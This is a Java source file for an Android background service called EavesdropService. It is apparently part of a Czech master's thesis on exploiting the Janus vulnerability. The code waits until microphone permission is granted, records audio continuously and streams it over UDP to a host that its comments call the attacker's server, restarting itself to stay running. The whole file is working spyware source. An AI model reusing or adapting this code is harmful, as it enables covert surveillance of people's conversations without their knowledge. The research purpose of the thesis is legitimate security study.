// Tento kod je součást diplomové práce Využití zranitelnosti Janus na operačním systému Android
// Autor: Bc. Vít Souček
//
// Zdroje: Uvedeny v komentářích u jednotlivých metod

package com.example.audioservice;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.audiofx.AcousticEchoCanceler;
import android.media.audiofx.NoiseSuppressor;
import android.os.IBinder;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.concurrent.TimeUnit;


public class EavesdropService extends Service {

    private final String address = "10.0.2.2";
    private final int port = 50005;
    private DatagramSocket socket;
    private DatagramPacket packet;
    private InetAddress destination;

    private AudioRecord recorder;

    private final int sampleRate = 44100;
    private final int channelConfig = AudioFormat.CHANNEL_IN_MONO;
    private final int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
    private final int minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 10;

    private volatile boolean status = true;

    /**
     * Konstruktor.
     */
    public EavesdropService(){
    }

    /**
     * Callback metoda volaná při vytvoření service.
     */
    @Override
    public void onCreate() {
        super.onCreate();
    }

    /**
     * Callback metoda volaná při navázání service.
     *
     * @param intent Intent se kterým se service volá
     * @return Null -- metoda zde není potřebná
     */
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Callback metoda volaná při ukončení navázání service.
     *
     * @param intent Intent se kterým je service volaná
     * @return Návratová hodnota nadtřídy
     */
    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }

    /**
     * Hlavni metoda odposlechu. Volaná při spuštění service (startService).
     * <p>
     * Metoda vytvoří vlákno obsahující veškerou funkcionalitu odposlechu.
     * Vlákno nejprve čeká na získání potřebných povolení.
     * Potom inicializuje všechny objekty potřebné pro nahrávání.
     * Následuje cyklus, ve kterém se nahrávají data z mikrofonu
     * odesílají se na útočníkův server.
     * Když je cyklus ukončen, všechny na začátku inicializované objekty jsou uvolněny.
     *
     * Způsob nahrávání zvuku je založen na odpovědi na StackOverflow otázku
     * 'Stream Live Android Audio to Server'.
     * Autor odpovědi: chuckliddell0, dostupné z:
     * https://stackoverflow.com/a/15694209/6136143
     *
     * @param intent  Intent se kterým je volaná tato metoda
     * @param flags   Příznaky intentu
     * @param startId Unikátní číslo identifikující spuštění služby
     * @return START_STICKY (system službu udržuje spuštěnou)
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Thread streamThread = new Thread(new Runnable() {

            @Override
            public void run() {

                waitForPermissions();

                byte[] buffer = new byte[minBufSize];

                initializeNetworking();

                initializeAudioRecording();

                recorder.startRecording();

                while (status) {
                    int read = recorder.read(buffer, 0, buffer.length);
                    packet = new DatagramPacket(buffer, read, destination, port);

                    try {
                        socket.send(packet);
                    } catch (IOException ignored) { }
                }

                if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
                    recorder.stop();
                    recorder.release();
                }
            }
        });

        streamThread.start();

        return START_STICKY;
    }

    private void initializeNetworking(){
        try {
            socket = new DatagramSocket();
        } catch (SocketException e) {
            e.printStackTrace();
            System.exit(1);
        }

        try {
            destination = InetAddress.getByName(address);
        } catch (UnknownHostException e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    /**
     * Inicializuje všechny objekty potřebné pro nahravani zvuku.
     * Recorder je nutny a pokud je obsazeny, ceka se na jeho uvolneni.
     * Echo canceller a Noise suppressor jsou pouze pro zlepseni kvality.
     *
     * Spravny zpusob inicializace potrebnych objektu je zalozen na odpovedi na StackOverflow otazku
     * 'Stream Live Android Audio to Server'.
     * Autor odpovedi: chuckliddell0, dostupne z:
     * https://stackoverflow.com/a/15694209/6136143
     */
    private void initializeAudioRecording(){
        recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);

        while (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException ignored) { }
            recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);
        }

        if (AcousticEchoCanceler.isAvailable()) {
            AcousticEchoCanceler.create(recorder.getAudioSessionId());
        }
        if (NoiseSuppressor.isAvailable()) {
            NoiseSuppressor.create(recorder.getAudioSessionId());
        }
    }

    /**
     * Metoda volaná, pokud je service rušena.
     * Zastaví nahrávací smyčku v hlavním vláknu.
     */
    @Override
    public void onDestroy() {
        status = false;
        super.onDestroy();
    }

    /**
     * Metoda volaná pokud uživatel odstraní task původní aplikace.
     *
     * @param rootIntent Intent se kterým je volaná tato metoda.
     */
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        status = false;
    }

    /**
     * Čeká, než uživatel aplikaci přidělí potřebná oprávnění (ze service nelze oprávnění vyžadovat)
     * Je nutné testovat pouze RECORD_AUDIO, INTERNET je získán automaticky.
     *
     * Inspirováno odpovědí na StackOverflow.com otázku
     * 'Android Studio asking for permission check after permission checked'.
     * Autor odpovědi: rafsanahmad007, dostupné z:
     * https://stackoverflow.com/a/43676323/6136143
     */
    private void waitForPermissions() {
        while (this.checkCallingOrSelfPermission(Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException ignored) { }
        }
    }
}
